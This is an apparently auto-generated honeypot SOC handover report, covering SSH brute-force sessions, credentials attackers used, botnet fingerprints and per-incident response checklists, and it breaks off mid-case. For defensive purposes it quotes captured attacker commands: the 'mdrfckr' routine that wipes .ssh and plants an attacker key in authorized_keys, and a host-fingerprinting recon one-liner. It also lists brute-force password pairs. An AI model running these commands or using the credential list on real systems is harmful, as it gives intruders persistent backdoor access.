# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-13 |
| **Generated At** | 2026-08-13T13:20:59Z |
| **Shift Time** | 13:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **141** |
| Confirmed Threats | **116** |
| False Positives Filtered | **25** (17.7%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **30** |
| High Severity Cases | **53** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **88** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **67** |
| Unique Credential Pairs | **45** |
| Unique Usernames | **10** |
| Unique Passwords | **43** |
| Successful Auth Pairs | **57** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `admin` | 9 |
| `centos` | 6 |
| `debian` | 4 |
| `support` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 4 |
| `` | 4 |
| `techsupport` | 4 |
| `superuser` | 3 |
| `345gs5662d34` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 4 |
| `admin` | `` | 4 |
| `centos` | `techsupport` | 4 |
| `root` | `superuser` | 3 |
| `345gs5662d34` | `345gs5662d34` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `debian` | `P@ssw0rd` | `116.72.9.151` | 2026-08-13T11:03:31 |
| `debian` | `P@ssw0rd` | `106.245.246.26` | 2026-08-13T11:03:41 |
| `debian` | `123654` | `117.247.239.202` | 2026-08-13T11:06:48 |
| `admin` | `Mikro362496` | `211.178.165.251` | 2026-08-13T11:09:22 |
| `support` | `support` | `10.0.0.73` | 2026-08-13T11:11:17 |
| `admin` | `22` | `122.170.97.94` | 2026-08-13T11:12:14 |
| `root` | `superuser` | `10.0.0.73` | 2026-08-13T11:25:56 |
| `root` | `superuser` | `49.124.152.225` | 2026-08-13T11:27:39 |
| `root` | `superuser` | `46.201.247.21` | 2026-08-13T11:27:47 |
| `root` | `debian` | `61.240.17.66` | 2026-08-13T11:28:21 |
| `root` | `test1234.` | `190.60.43.27` | 2026-08-13T11:34:06 |
| `345gs5662d34` | `345gs5662d34` | `190.60.43.27` | 2026-08-13T11:34:09 |
| `root` | `3245gs5662d34` | `190.60.43.27` | 2026-08-13T11:34:09 |
| `config` | `qwerty12345` | `210.206.24.237` | 2026-08-13T11:37:57 |
| `config` | `qwerty12345` | `195.222.57.183` | 2026-08-13T11:38:04 |
| `support` | `support` | `176.53.159.196` | 2026-08-13T11:43:45 |
| `blank` | `123456` | `116.48.138.69` | 2026-08-13T11:46:23 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-13T11:48:50 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-13T11:49:56 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-13T11:49:57 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-13T11:50:03 |
| `nobody` | `logon` | `10.0.0.73` | 2026-08-13T11:53:34 |
| `root` | `123` | `80.94.92.55` | 2026-08-13T12:06:29 |
| `root` | `1234` | `80.94.92.55` | 2026-08-13T12:09:21 |
| `root` | `12345` | `80.94.92.55` | 2026-08-13T12:11:57 |
| `xzy` | `xzy` | `179.40.112.10` | 2026-08-13T12:14:11 |
| `345gs5662d34` | `345gs5662d34` | `179.40.112.10` | 2026-08-13T12:14:14 |
| `xzy` | `3245gs5662d34` | `179.40.112.10` | 2026-08-13T12:14:15 |
| `blank` | `123456` | `111.70.32.51` | 2026-08-13T12:15:20 |
| `root` | `1234567` | `80.94.92.55` | 2026-08-13T12:16:52 |
| `centos` | `uploader` | `178.178.222.58` | 2026-08-13T12:18:24 |
| `centos` | `uploader` | `203.192.247.84` | 2026-08-13T12:18:37 |
| `root` | `12345678` | `80.94.92.55` | 2026-08-13T12:19:30 |
| `root` | `Kong@2022` | `197.248.207.139` | 2026-08-13T12:20:48 |
| `345gs5662d34` | `345gs5662d34` | `197.248.207.139` | 2026-08-13T12:20:52 |
| `root` | `3245gs5662d34` | `197.248.207.139` | 2026-08-13T12:20:54 |
| `root` | `123456789` | `80.94.92.55` | 2026-08-13T12:21:53 |
| `root` | `1234567890` | `80.94.92.55` | 2026-08-13T12:24:15 |
| `root` | `123abc` | `80.94.92.55` | 2026-08-13T12:26:37 |
| `root` | `1q2w3e4r` | `80.94.92.55` | 2026-08-13T12:29:16 |
| `root` | `P@ssw0rd123` | `80.94.92.55` | 2026-08-13T12:31:41 |
| `admin` | `internet` | `10.0.0.73` | 2026-08-13T12:32:36 |
| `root` | `abc123` | `80.94.92.55` | 2026-08-13T12:34:10 |
| `centos` | `techsupport` | `10.0.0.73` | 2026-08-13T12:35:09 |
| `root` | `admin123` | `80.94.92.55` | 2026-08-13T12:36:42 |
| `centos` | `techsupport` | `186.235.193.170` | 2026-08-13T12:36:47 |
| `root` | `letmein` | `80.94.92.55` | 2026-08-13T12:39:11 |
| `root` | `pass123` | `80.94.92.55` | 2026-08-13T12:41:57 |
| `root` | `password` | `80.94.92.55` | 2026-08-13T12:45:02 |
| `blank` | `0000000000` | `116.114.84.246` | 2026-08-13T12:46:35 |
| `blank` | `0000000000` | `61.77.220.62` | 2026-08-13T12:46:49 |
| `root` | `password1` | `80.94.92.55` | 2026-08-13T12:47:24 |
| `root` | `qwerty123` | `80.94.92.55` | 2026-08-13T12:49:46 |
| `root` | `root123` | `80.94.92.55` | 2026-08-13T12:52:06 |
| `centos` | `techsupport` | `60.223.250.50` | 2026-08-13T12:52:59 |
| `centos` | `techsupport` | `111.70.23.248` | 2026-08-13T12:53:09 |
| `debian` | `987654321` | `111.53.131.79` | 2026-08-13T12:54:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **141** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 26 |
| OpenSSH | 19 |
| libssh | 17 |
| Paramiko (Python) | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 19 | 19 |
| `2ec37a7cc8da...` | Mirai/variant | 19 | 1 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 19 | 19 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 19 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 18 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.55`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.248.207.139`, `179.40.112.10`, `190.60.43.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **57** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | LOW |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS3786` | LG DACOM Corporation | 2 | HIGH |
| `AS4760` | HKT Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8db6005b0fa8

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-13 11:03 |
| **Last Seen** | 2026-08-13 11:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:03:27` | `cowrie.session.connect` |
| `2026-08-13 11:03:27` | `cowrie.client.version` |
| `2026-08-13 11:03:27` | `cowrie.client.kex` |
| `2026-08-13 11:03:31` | `cowrie.login.success` |
| `2026-08-13 11:03:32` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d38682ab128

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-08-13 11:03 |
| **Last Seen** | 2026-08-13 11:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:03:38` | `cowrie.session.connect` |
| `2026-08-13 11:03:38` | `cowrie.client.version` |
| `2026-08-13 11:03:38` | `cowrie.client.kex` |
| `2026-08-13 11:03:41` | `cowrie.login.success` |
| `2026-08-13 11:03:42` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad0208dae622

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-08-13 11:06 |
| **Last Seen** | 2026-08-13 11:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:06:45` | `cowrie.session.connect` |
| `2026-08-13 11:06:46` | `cowrie.client.version` |
| `2026-08-13 11:06:46` | `cowrie.client.kex` |
| `2026-08-13 11:06:48` | `cowrie.login.success` |
| `2026-08-13 11:06:49` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e95f6ab7ac3

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-08-13 11:09 |
| **Last Seen** | 2026-08-13 11:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:09:19` | `cowrie.session.connect` |
| `2026-08-13 11:09:20` | `cowrie.client.version` |
| `2026-08-13 11:09:20` | `cowrie.client.kex` |
| `2026-08-13 11:09:22` | `cowrie.login.success` |
| `2026-08-13 11:09:22` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1e1b7999a6b

| Field | Detail |
|---|---|
| **Source IP** | `122.170.97[.]94` |
| **First Seen** | 2026-08-13 11:12 |
| **Last Seen** | 2026-08-13 11:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:12:12` | `cowrie.session.connect` |
| `2026-08-13 11:12:13` | `cowrie.client.version` |
| `2026-08-13 11:12:13` | `cowrie.client.kex` |
| `2026-08-13 11:12:14` | `cowrie.login.success` |
| `2026-08-13 11:12:15` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.97[.]94` to AbuseIPDB if not already reported
- [ ] Block `122.170.97[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4444b568bc

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]225` |
| **First Seen** | 2026-08-13 11:27 |
| **Last Seen** | 2026-08-13 11:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:27:37` | `cowrie.session.connect` |
| `2026-08-13 11:27:37` | `cowrie.client.version` |
| `2026-08-13 11:27:37` | `cowrie.client.kex` |
| `2026-08-13 11:27:39` | `cowrie.login.success` |
| `2026-08-13 11:27:40` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]225` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10b9ea6b19e

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-08-13 11:27 |
| **Last Seen** | 2026-08-13 11:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:27:45` | `cowrie.session.connect` |
| `2026-08-13 11:27:46` | `cowrie.client.version` |
| `2026-08-13 11:27:46` | `cowrie.client.kex` |
| `2026-08-13 11:27:47` | `cowrie.login.success` |
| `2026-08-13 11:27:47` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd8c4fa0316

| Field | Detail |
|---|---|
| **Source IP** | `61.240.17[.]66` |
| **First Seen** | 2026-08-13 11:28 |
| **Last Seen** | 2026-08-13 11:31 |
| **Session Duration** | 168s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:28:19` | `cowrie.session.connect` |
| `2026-08-13 11:28:19` | `cowrie.client.version` |
| `2026-08-13 11:28:19` | `cowrie.client.kex` |
| `2026-08-13 11:28:21` | `cowrie.login.success` |
| `2026-08-13 11:31:06` | `cowrie.session.file_upload` |
| `2026-08-13 11:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.240.17[.]66` to AbuseIPDB if not already reported
- [ ] Block `61.240.17[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba50c13bfd1

| Field | Detail |
|---|---|
| **Source IP** | `190.60.43[.]27` |
| **First Seen** | 2026-08-13 11:34 |
| **Last Seen** | 2026-08-13 11:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:34:06` | `cowrie.session.connect` |
| `2026-08-13 11:34:06` | `cowrie.client.version` |
| `2026-08-13 11:34:06` | `cowrie.client.kex` |
| `2026-08-13 11:34:06` | `cowrie.login.success` |
| `2026-08-13 11:34:07` | `cowrie.session.params` |
| `2026-08-13 11:34:07` | `cowrie.command.input` |
| `2026-08-13 11:34:07` | `cowrie.command.failed` |
| `2026-08-13 11:34:07` | `cowrie.log.closed` |
| `2026-08-13 11:34:08` | `cowrie.session.params` |
| `2026-08-13 11:34:08` | `cowrie.command.input` |
| `2026-08-13 11:34:08` | `cowrie.session.file_download` |
| `2026-08-13 11:34:08` | `cowrie.log.closed` |
| `2026-08-13 11:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.60.43[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.60.43[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d923785fa9b6

| Field | Detail |
|---|---|
| **Source IP** | `190.60.43[.]27` |
| **First Seen** | 2026-08-13 11:34 |
| **Last Seen** | 2026-08-13 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:34:08` | `cowrie.session.connect` |
| `2026-08-13 11:34:08` | `cowrie.client.version` |
| `2026-08-13 11:34:08` | `cowrie.client.kex` |
| `2026-08-13 11:34:09` | `cowrie.login.success` |
| `2026-08-13 11:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.60.43[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.60.43[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b784a4734f48

| Field | Detail |
|---|---|
| **Source IP** | `190.60.43[.]27` |
| **First Seen** | 2026-08-13 11:34 |
| **Last Seen** | 2026-08-13 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:34:09` | `cowrie.session.connect` |
| `2026-08-13 11:34:09` | `cowrie.client.version` |
| `2026-08-13 11:34:09` | `cowrie.client.kex` |
| `2026-08-13 11:34:09` | `cowrie.login.success` |
| `2026-08-13 11:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.60.43[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.60.43[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe2fc26cda28

| Field | Detail |
|---|---|
| **Source IP** | `210.206.24[.]237` |
| **First Seen** | 2026-08-13 11:37 |
| **Last Seen** | 2026-08-13 11:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:37:55` | `cowrie.session.connect` |
| `2026-08-13 11:37:55` | `cowrie.client.version` |
| `2026-08-13 11:37:55` | `cowrie.client.kex` |
| `2026-08-13 11:37:57` | `cowrie.login.success` |
| `2026-08-13 11:37:57` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.206.24[.]237` to AbuseIPDB if not already reported
- [ ] Block `210.206.24[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174000db6186

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-08-13 11:38 |
| **Last Seen** | 2026-08-13 11:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:38:03` | `cowrie.session.connect` |
| `2026-08-13 11:38:03` | `cowrie.client.version` |
| `2026-08-13 11:38:03` | `cowrie.client.kex` |
| `2026-08-13 11:38:04` | `cowrie.login.success` |
| `2026-08-13 11:38:04` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b028cbd062dd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-13 11:43 |
| **Last Seen** | 2026-08-13 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:43:45` | `cowrie.session.connect` |
| `2026-08-13 11:43:45` | `cowrie.client.version` |
| `2026-08-13 11:43:45` | `cowrie.client.kex` |
| `2026-08-13 11:43:45` | `cowrie.login.success` |
| `2026-08-13 11:43:45` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:43:45` | `cowrie.direct-tcpip.data` |
| `2026-08-13 11:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0729f5a6592d

| Field | Detail |
|---|---|
| **Source IP** | `116.48.138[.]69` |
| **First Seen** | 2026-08-13 11:46 |
| **Last Seen** | 2026-08-13 11:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:46:20` | `cowrie.session.connect` |
| `2026-08-13 11:46:21` | `cowrie.client.version` |
| `2026-08-13 11:46:21` | `cowrie.client.kex` |
| `2026-08-13 11:46:23` | `cowrie.login.success` |
| `2026-08-13 11:46:23` | `cowrie.direct-tcpip.request` |
| `2026-08-13 11:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.138[.]69` to AbuseIPDB if not already reported
- [ ] Block `116.48.138[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb226b78854f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-13 11:49 |
| **Last Seen** | 2026-08-13 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 11:49:56` | `cowrie.session.connect` |
| `2026-08-13 11:49:56` | `cowrie.client.version` |
